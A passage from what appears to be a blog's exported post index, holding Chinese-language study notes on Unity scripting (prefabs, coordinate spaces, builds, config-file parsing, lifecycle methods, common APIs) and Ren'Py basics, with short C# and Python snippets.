class="keyword">private</span> NavMeshAgent agent;</span><br><span class="line">    <span class="keyword">public</span> Transform targetTransform;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        agent = GetComponent&lt;NavMeshAgent&gt;();</span><br><span class="line">        Vector3 target = targetTransform.position;</span><br><span class="line">        <span class="comment">// 设置目标</span></span><br><span class="line">        agent.SetDestination(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h2><h3 id="1-预制件"><a href="#1-预制件" class="headerlink" title="1 预制件"></a>1 预制件</h3><blockquote><p>同类的对象拖动至 Assets 中，可以对其进行操作，然后应用到所有同类对象中。</p><p>改 Assets 会对所有对象生效，改 Object 的仅对自己生效，可以选择还原或应用。</p><p>Prefab——：</p><ul><li>Select：通过预制件实例找到对应预制件。</li><li>Overrides——Revert all：全部还原。</li><li>Overrides——Apply all：全部应用。</li></ul></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码读取资源，必须在Resources目录下</span></span><br><span class="line">GameObject prefabGo = Resources.Load&lt;GameObject&gt;(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建资源（预制件，位置，无额外选择）</span></span><br><span class="line">Instantiate(Prefab,position,Quaternion.identity);</span><br></pre></td></tr></table></figure><h3 id="2-坐标"><a href="#2-坐标" class="headerlink" title="2 坐标"></a>2 坐标</h3><blockquote><p>World Space：世界坐标。相对世界原点。</p><p>Local Space：局部坐标。相对父物体。</p><p>Screen Space：</p><ul><li>屏幕坐标。相对屏幕的坐标。单位为像素。左下<code>(0,0)</code>，右上<code>(Screen.weight,Screen.height)</code>。Z轴为到相机的距离。</li><li>用于物体在屏幕中的位置。</li></ul><p>Viewport Space：</p><ul><li>视口坐标。屏幕左下为<code>(0,0)</code>，右上为<code>(1,1)</code>，Z轴为到相机的距离。</li></ul><ul><li>用于表示物体在摄像机中的位置。</li></ul></blockquote><h3 id="3-打包"><a href="#3-打包" class="headerlink" title="3 打包"></a>3 打包</h3><blockquote><p>File——Build Settings——Build</p><p>Q1.Cannot build player while editor is importing assets or compiling scripts</p><p>A1（任一）：</p><ul><li>很可能是代码错了，看Console报错信息。</li><li>引用了UnityEditor的脚本放在Editor文件夹下（好像就不会编译了）。</li><li><code>#if UNITY_EDITOR using UnityEditor; #endif</code></li></ul></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*打包不能使用的包如下:*/</span></span><br><span class="line"><span class="comment">// 1.获取图集中元素（无法通过：GetPackables()）</span></span><br><span class="line"><span class="keyword">foreach</span> (Sprite sprite <span class="keyword">in</span> sprites.GetPackables())&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.获取Assets中的资源（无法通过：AssetDatabase）</span></span><br><span class="line">GameObject prefab = AssetDatabase.LoadAssetAtPath&lt;GameObject&gt;(<span class="string">&quot;...&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="4-特殊文件夹"><a href="#4-特殊文件夹" class="headerlink" title="4 特殊文件夹"></a>4 特殊文件夹</h3><p>StreamingAssets</p><blockquote><p>该文件夹在打包时不会被压缩和加密。</p><p>用于存放相关配置文件，比如版本，提示语句等。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取配置文件</span></span><br><span class="line"><span class="built_in">string</span> configPath = Path.Combine(Application.streamingAssetsPath,<span class="string">&quot;Config.txt&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取配置文件内容，配置文件格式如下：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Game]</span></span><br><span class="line"><span class="comment">Version = 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[Login]</span></span><br><span class="line"><span class="comment">Username = Bob</span></span><br><span class="line"><span class="comment">Password = 123456</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">ReadConfig</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> Dictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;&gt; configData;</span><br><span class="line">    <span class="built_in">string</span> filePath = Path.Combine(Application.streamingAssetsPath, <span class="string">&quot;Config.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容</span></span><br><span class="line">    <span class="built_in">string</span>[] lines = File.ReadAllLines(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化字典</span></span><br><span class="line">    configData = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> currentSection = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析文件内容</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> line <span class="keyword">in</span> lines)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (line.StartsWith(<span class="string">&quot;[&quot;</span>) &amp;&amp; line.EndsWith(<span class="string">&quot;]&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 解析节标题</span></span><br><span class="line">            currentSection = line.Substring(<span class="number">1</span>, line.Length - <span class="number">2</span>);</span><br><span class="line">            configData[currentSection] = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(line))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 解析键值对</span></span><br><span class="line">            <span class="built_in">string</span>[] parts = line.Split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (parts.Length == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> key = parts[<span class="number">0</span>].Trim();</span><br><span class="line">                <span class="built_in">string</span> <span class="keyword">value</span> = parts[<span class="number">1</span>].Trim().Trim(<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">                configData[currentSection][key] = <span class="keyword">value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印字典内容（可选）</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> section <span class="keyword">in</span> configData)</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Log(<span class="string">&quot;[&quot;</span> + section.Key + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> pair <span class="keyword">in</span> section.Value)</span><br><span class="line">        &#123;</span><br><span class="line">            Debug.Log(pair.Key + <span class="string">&quot; = &quot;</span> + pair.Value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="十一、问题"><a href="#十一、问题" class="headerlink" title="十一、问题"></a>十一、问题</h2><h3 id="1-Project看不到文件夹下文件"><a href="#1-Project看不到文件夹下文件" class="headerlink" title="1 Project看不到文件夹下文件"></a>1 Project看不到文件夹下文件</h3><h3 id="2-Package-Manager下载路径"><a href="#2-Package-Manager下载路径" class="headerlink" title="2 Package Manager下载路径"></a>2 Package Manager下载路径</h3><blockquote><p>默认路径：<code>C:\Users\[YourName]\AppData\Roaming\Unity\Asset Store-5.x</code></p><ol><li>找到路径</li><li>打开cmd</li><li><code>mklink /j “C:\Users\[YourName]\AppData\Roaming\Unity\Asset Store-5.x” “[NewPath]”</code></li><li>去除原文件夹的只读属性</li></ol></blockquote><h3 id="3-您暂无权限在该组织中创建远程仓库！"><a href="#3-您暂无权限在该组织中创建远程仓库！" class="headerlink" title="3 您暂无权限在该组织中创建远程仓库！"></a>3 您暂无权限在该组织中创建远程仓库！</h3><blockquote><p> <a href="https://developer.unity.cn/ask/question/62d1537cedbc2a39f792b76f">解决方案</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Renpy</title>
      <link href="/posts/cca63ac3.html"/>
      <url>/posts/cca63ac3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Renpy"><a href="#Renpy" class="headerlink" title="Renpy"></a>Renpy</h1><blockquote><p><a href="http://www.renpy.cn/doc/index.html">official::官方文档</a></p></blockquote><hr><h2 id="一、简单使用"><a href="#一、简单使用" class="headerlink" title="一、简单使用"></a>一、简单使用</h2><h3 id="1-编辑器使用"><a href="#1-编辑器使用" class="headerlink" title="1 编辑器使用"></a>1 编辑器使用</h3><h3 id="2-代码编写"><a href="#2-代码编写" class="headerlink" title="2 代码编写"></a>2 代码编写</h3><h4 id="2-1-输入"><a href="#2-1-输入" class="headerlink" title="2.1 输入"></a>2.1 输入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python:</span><br><span class="line">n = renpy.<span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-2-输出"><a href="#2-2-输出" class="headerlink" title="2.2 输出"></a>2.2 输出</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在语句中变量用 [n] 括起则可以输出变量的值</span></span><br><span class="line">i <span class="string">&quot;n is [n]&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-变量赋值"><a href="#2-3-变量赋值" class="headerlink" title="2.3 变量赋值"></a>2.3 变量赋值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单个变量赋值</span></span><br><span class="line">menu:</span><br><span class="line">    <span class="string">&quot;你选择&quot;</span></span><br><span class="line">    <span class="string">&quot;继续&quot;</span>:</span><br><span class="line">        $ out = <span class="number">1</span></span><br><span class="line">    <span class="string">&quot;结束&quot;</span>:</span><br><span class="line">        $ out = <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="2-3-使用Python语句"><a href="#2-3-使用Python语句" class="headerlink" title="2.3 使用Python语句"></a>2.3 使用Python语句</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行多行python语句</span></span><br><span class="line">python:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">H</span>():</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;hello&quot;</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot; world&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、项目"><a href="#二、项目" class="headerlink" title="二、项目"></a>二、项目</h2><h3 id="1-一键生成Gal"><a href="#1-一键生成Gal" class="headerlink" title="1 一键生成Gal"></a>1 一键生成Gal</h3><blockquote><p><a href="https://github.com/Quandong-Zhang/movie2galagame">author::大佬原项目链接</a>   </p><p><a href="https://github.com/KUN1007/movie2galagame">author::别人优化后链接</a></p><p>效果：在文件夹中放入视频和字幕，软件会根据视频和字幕自动生成Renpy的项目相关文件，然后在Renpy中配置项目后启动即可使用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Renpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity脚本</title>
      <link href="/posts/cf1dc19e.html"/>
      <url>/posts/cf1dc19e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unity脚本"><a href="#Unity脚本" class="headerlink" title="Unity脚本"></a>Unity脚本</h1><blockquote><p><a href="https://docs.unity.cn/cn/2021.1/ScriptReference/index.html">official::Unity 脚本 API</a></p><p>VS提取方法：Ctrl + R &amp;&amp; Ctrl + M</p></blockquote><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><blockquote><p>定义：脚本是附加在游戏物体上用于定义游戏对象行为的指令代码。</p><p>添加：</p><ul><li>文件名必须与类名一致。</li><li>写好的脚本必须附加到物体上才执行。</li><li>附加到游戏物体的脚本类必须从MonoBehaviour类继承。</li></ul><p>编译：源代码( CLS ) -&gt; 中间语言( Mono Runtime )（中间产物是 .dll ） -&gt; 机器码。</p></blockquote><hr><h2 id="二、脚本"><a href="#二、脚本" class="headerlink" title="二、脚本"></a>二、脚本</h2><h3 id="1-脚本操作"><a href="#1-脚本操作" class="headerlink" title="1 脚本操作"></a>1 脚本操作</h3><h4 id="1-1-新建脚本默认"><a href="#1-1-新建脚本默认" class="headerlink" title="1.1 新建脚本默认"></a>1.1 新建脚本默认</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">NewBehaviourScript</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">   <span class="comment">// 初始化被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">   <span class="comment">//  约0.02秒被调用一次</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-修改新建默认"><a href="#1-2-修改新建默认" class="headerlink" title="1.2 修改新建默认"></a>1.2 修改新建默认</h4><blockquote><p>默认模板存放位置：Unity\2021.3.5f1c1\Editor\Data\Resources\ScriptTemplates</p></blockquote><h4 id="1-3-开发工具设置"><a href="#1-3-开发工具设置" class="headerlink" title="1.3 开发工具设置"></a>1.3 开发工具设置</h4><blockquote><p>Edit——Preferences——External Tools——External Script Editor</p></blockquote><h4 id="1-4-脚本辅助操作"><a href="#1-4-脚本辅助操作" class="headerlink" title="1.4 脚本辅助操作"></a>1.4 脚本辅助操作</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写在其他脚本中，写了后Untiy会自动判断该物体是否挂了MyScript，没有则挂上</span></span><br><span class="line">[<span class="meta">RequireComponent(typeof(MyScript))</span>]</span><br></pre></td></tr></table></figure><h3 id="2-脚本生命周期"><a href="#2-脚本生命周期" class="headerlink" title="2 脚本生命周期"></a>2 脚本生命周期</h3><blockquote><p><a href="https://docs.unity3d.com/cn/2017.2/Manual/index.html">official::脚本API</a></p><p><a href="https://www.jianshu.com/p/f6c0bf8ad1e5">脚本生命流程图</a></p></blockquote><div class="table-container"><table><thead><tr><th>函数执行顺序</th><th>阶段</th><th>作用</th></tr></thead><tbody><tr><td>Awake</td><td>物体初始化阶段</td><td>赋值</td></tr><tr><td>OnEnable</td><td>物体初始化阶段</td><td>赋值</td></tr><tr><td>Start</td><td>物体初始化阶段</td><td>赋值</td></tr><tr><td>FixedUpdate</td><td>物理计算阶段</td><td>物理物件计算</td></tr><tr><td>OnTriggerEnter</td><td>物理计算阶段</td><td>物理物件计算</td></tr><tr><td>OnCollisionEnter</td><td>物理计算阶段</td><td>物理物件计算</td></tr><tr><td>Update</td><td>游戏过程计算阶段</td><td>计算更新</td></tr><tr><td>LateUpdate</td><td>游戏过程计算阶段</td><td>Camera</td></tr><tr><td>OnDisable</td><td>物体退出阶段</td><td>禁用事件</td></tr><tr><td>OnDestroy</td><td>物体退出阶段</td><td>销毁事件</td></tr></tbody></table></div><h4 id="2-1-格式"><a href="#2-1-格式" class="headerlink" title="2.1 格式"></a>2.1 格式</h4><blockquote><p>类：字段+方法。</p><p>属性：一般不写。（编辑器中无法普通显示）</p><p>构造函数：不写。</p></blockquote><h4 id="2-2-字段"><a href="#2-2-字段" class="headerlink" title="2.2 字段"></a>2.2 字段</h4><blockquote><p><code>public</code> 会显示可重新赋值。（要隐藏在字段上一行加上 <code>[HideInInspector]</code> ）</p><p><code>private</code>不会显示。（要显示需要在字段上一行加上 <code>[SerializeField]</code> ）</p><p><code>[SerializeField]</code>：（序列化字段）在编辑器中显示私有变量。（可以重新赋值）</p><p><code>[HideInInspector]</code>：（隐藏检查器）在编辑器中隐藏公有变量。</p><p><code>[Range(n,m)]：限定数字范围为[n,m]</code></p></blockquote><h4 id="2-3-方法"><a href="#2-3-方法" class="headerlink" title="2.3 方法"></a>2.3 方法</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="comment">// 都是在创建游戏对象时执行一次，但是执行完所有对象的Awake()后才执行所有对象的Start()</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span>;</span><br><span class="line"><span class="comment">// Awake：物体启用执行（仅一次）</span></span><br><span class="line"><span class="comment">// Start：脚本启用执行（仅一次）</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnEnable</span>()</span>;</span><br><span class="line"><span class="comment">// OnEnable：脚本启用执行（每次）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续更新</span></span><br><span class="line"><span class="comment">// FixedUpdate()每隔固定时间执行一次（时间可以修改），默认0.02s，不会受渲染的影响</span></span><br><span class="line"><span class="comment">// 适用于：对物体做物理操作（移动，旋转）</span></span><br><span class="line"><span class="comment">// 修改：Edit——Project Settings——Time——Fixed Timestep</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update()每个渲染帧执行一次，执行间隔不固定（受渲染影响）</span></span><br><span class="line"><span class="comment">//适用于：处理游戏逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注：渲染时间不固定（每帧的渲染量不同）</span></span><br><span class="line"><span class="comment">// LateUpdate()：在Update()执行完后执行一次（与Update处于同一渲染帧）</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">LateUpdate</span>()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入事件</span></span><br><span class="line">OnMouseEnter(); <span class="comment">// 鼠标移入到当前Collider时调用</span></span><br><span class="line">OnMouseOver(); <span class="comment">// 鼠标经过当前Collider时调用</span></span><br><span class="line">OnMouseExit(); <span class="comment">// 鼠标离开当前Collider时调用</span></span><br><span class="line">OnMouseDown(); <span class="comment">// 鼠标按下当前Collider时调用</span></span><br><span class="line">OnMouseUp(); <span class="comment">// 鼠标在当前Collider上抬起时调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景渲染</span></span><br><span class="line">OnBecameVisible(); <span class="comment">// 当Mesh Renderer在任何相机上可见时调用</span></span><br><span class="line">OnBecameInvisible(); <span class="comment">// 当Mesh Renderer在任何相机上都不可见时调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束阶段</span></span><br><span class="line">OnDisable(); <span class="comment">// 对象变为不可用或附属游戏对象非激活状态时此函数被调用</span></span><br><span class="line">OnDestroy(); <span class="comment">// 当脚本摧毁或附属游戏对象被销毁时被调用</span></span><br><span class="line">OnApplicationQuit(); <span class="comment">// 应用程序退出时被调用</span></span><br></pre></td></tr></table></figure><h3 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h3><p>C#逆向工具</p><blockquote><p>ILspy<br>Library——ScriptAssemblies——脚本中间语言存储位置</p></blockquote><p>语句调试</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在控制台中显示一条语句</span></span><br><span class="line">Debug.Log(<span class="string">&quot;&quot;</span>);</span><br><span class="line">Debug.LogFormat(<span class="string">&quot;&quot;</span>); <span class="comment">//格式化输出</span></span><br><span class="line"><span class="comment">// 在控制台中显示一条语句，只在脚本里用（属于MonoBehaviour的方法）</span></span><br><span class="line">print();</span><br><span class="line"></span><br><span class="line"><span class="comment">// a到b用白线连接</span></span><br><span class="line">Debug.DrawLine(a,b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2D画线，距离地面距离</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnDrawGizmos</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    Gizmos.DrawLine(transform.position, <span class="keyword">new</span> Vector3(transform.position.x, transform.position.y - groundCheckDistance));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Windows——General——Console</p><blockquote><p>Collapse：折叠相同项。</p></blockquote><p>VS调试</p><blockquote><p>F12——找到方法源头</p><p>VS断点——VS启动调试——Unity开始游戏——回到VS中调试</p><p>调试——窗口——即时调试 / 自动调试 / 监视</p></blockquote><h3 id="4-核心类图"><a href="#4-核心类图" class="headerlink" title="4 核心类图"></a>4 核心类图<img src="/posts/cf1dc19e/核心类图.png" alt></h3><h2 id="三、常用API"><a href="#三、常用API" class="headerlink" title="三、常用API"></a>三、常用API</h2><h3 id="1-Component"><a href="#1-Component" class="headerlink" title="1 Component"></a>1 Component</h3><blockquote><p>查找（在当前物体、后代、先辈）组件的功能。</p><p><code>this.GetComponent&lt;name&gt;()</code>：其他组件</p></blockquote><p>获取所有组件名</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponents();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> i <span class="keyword">in</span> comp)</span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取父子组件</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父</span></span><br><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponentsInParent&lt;MeshRenderer&gt;();</span><br><span class="line"><span class="comment">// 子</span></span><br><span class="line"><span class="keyword">var</span> comp = <span class="keyword">this</span>.GetComponentsInChildren&lt;MeshRenderer&gt;();</span><br></pre></td></tr></table></figure><h3 id="2-Transform"><a href="#2-Transform" class="headerlink" title="2 Transform"></a>2 Transform</h3><blockquote><p>查找（父、根、子）变换组件，改变对象的位置、旋转、缩放比例。</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象在世界坐标系的位置</span></span><br><span class="line"><span class="keyword">this</span>.transform.position;</span><br><span class="line"><span class="comment">// 对象相对父物体的位置</span></span><br><span class="line"><span class="keyword">this</span>.transform.localPosition;</span><br><span class="line"><span class="comment">// rotation同理，scale的local同理（相对父物体）</span></span><br><span class="line"><span class="comment">// lossyscale：模型与自身的缩放比例（可理解为全局）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 孩子数</span></span><br><span class="line"><span class="keyword">this</span>.transform.childCount;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// y是高度轴，Space.Self：自身坐标轴，Space.World：世界坐标轴（Space默认self）</span></span><br><span class="line"><span class="comment">// 位置增减变化</span></span><br><span class="line"><span class="keyword">this</span>.transform.translate(x,y,z,space);</span><br><span class="line"><span class="comment">// 角度增减变化（四元数旋转）</span></span><br><span class="line"><span class="keyword">this</span>.transform.Rotate(x,y,z,space);</span><br><span class="line"><span class="comment">// 围绕点，按哪个轴，旋转角度</span></span><br><span class="line"><span class="keyword">this</span>.transform.transform.RotateAround(point,axis,angle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物体在局部位置移动xyz后转化成世界坐标返回</span></span><br><span class="line">worldPosition = <span class="keyword">this</span>.transform.TransformPoint(x, y, z);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 旋转，照相机的视口对准目标</span></span><br><span class="line"><span class="keyword">this</span>.transform.LookAt(Vector3);</span><br></pre></td></tr></table></figure><p>获取父子物体的transform</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子物体</span></span><br><span class="line"><span class="keyword">foreach</span>(Transform child <span class="keyword">in</span> <span class="keyword">this</span>.transform);</span><br><span class="line"><span class="comment">// 根物体</span></span><br><span class="line"><span class="keyword">this</span>.transform.root;</span><br><span class="line"><span class="comment">// 父物体</span></span><br><span class="line"><span class="keyword">this</span>.transform.parent;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认爸爸（参数2：坐标视为世界坐标（true，默认），本地坐标（false））</span></span><br><span class="line"><span class="keyword">this</span>.transform.setParent(transform , worldposition);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找孩孙（可以用于找孩子的孩子，但是不建议）</span></span><br><span class="line"><span class="keyword">this</span>.transform.Find(<span class="string">&quot;child&#x27;s name [ / child&#x27;s name ... ]&quot;</span>);</span><br><span class="line"><span class="comment">// 找孩子</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span> ; i &lt; <span class="keyword">this</span>.transform.childCount ; i++ )</span><br><span class="line">    Transform tf = <span class="keyword">this</span>.transform.GetChild(i) ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解孩子</span></span><br><span class="line"><span class="keyword">this</span>.transform.DetachChildren();</span><br><span class="line"><span class="comment">// 摧毁孩子</span></span><br><span class="line">Transform tf = screen.transform.GetChild(<span class="number">0</span>);</span><br><span class="line">Destroy(tf.gameObject);</span><br></pre></td></tr></table></figure><h3 id="3-GameObject"><a href="#3-GameObject" class="headerlink" title="3 GameObject"></a>3 GameObject</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实际激活状态（父可能被禁用但自身没有）</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.activeInHierarchy;</span><br><span class="line"><span class="comment">// 自身激活状态</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.activeSelf;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置（启用/禁用）</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.SetActive(<span class="built_in">bool</span>);</span><br><span class="line"><span class="comment">// 添加class类组件</span></span><br><span class="line"><span class="keyword">this</span>.gameObject.AddComponent&lt;<span class="keyword">class</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过游戏名称找到物体（不建议使用）</span></span><br><span class="line">GameObject.Find(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 获取所有使用该标签的物体，返回数组</span></span><br><span class="line">GameObject.FindGameObjectsWithTag( <span class="string">&quot;tag&quot;</span> );</span><br><span class="line"><span class="comment">// 获取单个标签的物体</span></span><br><span class="line">GameObject.FindWithTag( <span class="string">&quot;tag&quot;</span> );</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例：找光</span></span><br><span class="line">GameObject lightGo = <span class="keyword">new</span> GameObject(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">Light light = lightGo.AddComponent&lt;Light&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找子物体Object</span></span><br><span class="line"><span class="keyword">private</span> Transform pointLight;</span><br><span class="line">pointLight = <span class="keyword">this</span>.transform.GetChild(<span class="number">0</span>);</span><br><span class="line">pointLight.gameObject.SetActive(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="4-Object"><a href="#4-Object" class="headerlink" title="4 Object"></a>4 Object</h3><p>属性</p><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除一个对象（对象，延迟时间）</span></span><br><span class="line">Destroy(obj,delay);</span><br><span class="line"><span class="comment">// 加载新场景时该对象不被删除</span></span><br><span class="line">DontDestroyOnLoad(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找对象（单个/全部）</span></span><br><span class="line">FindObjectOfType&lt;<span class="keyword">class</span>&gt;();</span><br><span class="line">FindObjectsOfType&lt;<span class="keyword">class</span>&gt;();</span><br></pre></td></tr></table></figure><h3 id="5-Time"><a href="#5-Time" class="headerlink" title="5 Time"></a>5 Time</h3><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 秒计算，游戏开始的时间（只读）</span></span><br><span class="line">Time.time;</span><br><span class="line"><span class="comment">// 秒计算，完成最后一帧的时间，渲染影响（只读）</span></span><br><span class="line">Time.deltaTime;</span><br><span class="line"><span class="comment">// 秒计算，完成最后一帧时间，固定。</span></span><br><span class="line">Time.fixedDeltaTime;</span><br><span class="line"><span class="comment">// 